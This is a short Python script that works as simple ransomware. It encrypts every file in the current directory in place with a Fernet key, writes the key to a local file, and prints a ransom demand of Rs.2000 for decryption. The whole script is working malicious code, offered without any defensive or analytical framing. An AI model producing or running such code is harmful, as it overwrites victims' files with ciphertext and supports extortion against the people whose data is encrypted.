import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file=="thekey.key" or file=="decrypt_files.py" or file=="encrypt_files.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print("Encrypting your All Files!!")

key = Fernet.generate_key()

with open("thekey.key","wb") as thefile:
    thefile.write(key)

for file in files:
    with open(file,"rb") as thefile:
        contents = thefile.read()
        contents_encrypt = Fernet(key).encrypt(contents)
    with open(file,'wb') as thefile:
        thefile.write(contents_encrypt)
        
print("You have been Hacked! Give me Rs.2000 to get your Decryption key to decrypt your files")